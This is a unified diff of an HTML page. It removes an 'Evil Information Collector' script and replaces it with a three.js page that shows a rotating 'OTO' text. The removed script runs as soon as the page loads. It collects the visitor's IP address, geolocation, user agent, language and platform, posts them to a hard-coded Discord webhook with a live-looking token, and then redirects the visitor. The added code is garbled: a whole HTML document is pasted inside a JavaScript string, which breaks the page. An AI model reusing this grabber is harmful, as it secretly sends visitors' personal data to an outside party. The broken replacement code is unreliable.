@@ -3,69 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Evil Information Collector</title>
+    <title>3D Text</title>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+        }
+        canvas {
+            width: 100%;
+            height: 100%;
+            display: block;
+        }
+    </style>
 </head>
 <body>
-    <h1>Oto grabber !</h1>
-    <p>Your ip and location has been send sorry!</p>
-
-    <!-- Include jQuery library -->
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <script>
-        // Function to gather information and send it to your webhook
-        function gatherAndSendInfo() {
-            // Get IP address using a third-party service
-            fetch('https://api.ipify.org/?format=json')
-            .then(response => response.json())
-            .then(ipData => {
-                // Get location information using Geolocation-DB API
-                return $.getJSON('https://geolocation-db.com/json/')
-                .then(location => {
-                    // Prepare the data payload to send to the webhook
-                    let details = `Country: ${location.country_name},
-                        State: ${location.state},
-                        City: ${location.city},
-                        Latitude: ${location.latitude},
-                        Longitude: ${location.longitude},
-                        IP: ${location.IPv4}`;
-                    let infoPayload = {
-                        content: `Evil Information Collector:
-                            IP: ${ipData.ip}
-                            Location Details:
-                            ${details}
-                            User Agent: ${navigator.userAgent}
-                            Language: ${navigator.language}
-                            Platform: ${navigator.platform}`
-                    };
+        const scene = new THREE.Scene();
+        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+        camera.position.z = 5;
 
-                    // Send the data to your webhook
-                    return fetch('https://discord.com/api/webhooks/1226675190612758580/lhGStDkGIetoCqKyt2KcLMaeJW2KxtWtVMclcZoiV13osRHo4cPYHeCq5LfR7Drhlvw-', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(infoPayload)
-                    });
-                });
-            })
-            .then(response => {
-                if (!response.ok) {
-                    console.error('Error sending information to webhook:', response.status);
-                }
-            })
-            .catch(error => {
-                console.error('Error sending information to webhook:', error);
+        const renderer = new THREE.WebGLRenderer();
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        document.body.appendChild(renderer.domElement);
+
+        const loader = new THREE.FontLoader();
+        loader.load('https://threejs.org/examples/fonts/helvetiker_regular.typeface.json', function(font) {
+            const textGeometry = new THREE.TextGeometry('OTO', {
+                font: font,
+                size: 1,
+                height: 0.2,
+                curveSegments: 12,
+                bevelEnabled: false
             });
+            textGeometry.center(); // Centrer le texte
+
+            const lineMaterial = new THREE.LineBasicMaterial({ color: 0xff0000 });
+            const textEdges = new THREE.EdgesGeometry(textGeometry);
+            const textLines = new THREE.LineSegments(textEdges, lineMaterial);
+            scene.add(textLines);
+
+            function animate() {
+                requestAnimationFrame(animate);
+                textLines.rotation.y += 0.01; // Rotation sur l'axe y
+                renderer.render(scene, camera);
+            }
+            animate();
+        });
+
+        // Redirection vers https://e-z.bio/oto/ au clic
+        document.addEventListener('click', function() {
+            window.location.href = '<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>3D Text</title>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
         }
+        canvas {
+            width: 100%;
+            height: 100%;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script>
+        const scene = new THREE.Scene();
+        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+        camera.position.z = 5;
 
-        // Call the function to start the evil process
-        gatherAndSendInfo();
+        const renderer = new THREE.WebGLRenderer();
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        document.body.appendChild(renderer.domElement);
 
-        // Redirect after 1 second
-        setTimeout(function() {
-            window.location.replace('https://superlogout.com/');
-        }, 1000);
+        const loader = new THREE.FontLoader();
+        loader.load('https://threejs.org/examples/fonts/helvetiker_regular.typeface.json', function(font) {
+            const textGeometry = new THREE.TextGeometry('OTO', {
+                font: font,
+                size: 1,
+                height: 0.2,
+                curveSegments: 12,
+                bevelEnabled: false
+            });
+            textGeometry.center(); // Centrer le texte
+
+            const lineMaterial = new THREE.LineBasicMaterial({ color: 0xff0000 });
+            const textEdges = new THREE.EdgesGeometry(textGeometry);
+            const textLines = new THREE.LineSegments(textEdges, lineMaterial);
+            scene.add(textLines);
+
+            function animate() {
+                requestAnimationFrame(animate);
+                textLines.rotation.y += 0.01; // Rotation sur l'axe y
+                renderer.render(scene, camera);
+            }
+            animate();
+        });
+
+        // Redirection vers https://e-z.bio/oto/ au clic
+        document.addEventListener('click', function() {
+            window.location.href = 'https://e-z.bio/oto';
+        });
+    </script>
+</body>
+</html>
+';
+        });
     </script>
 </body>
 </html>
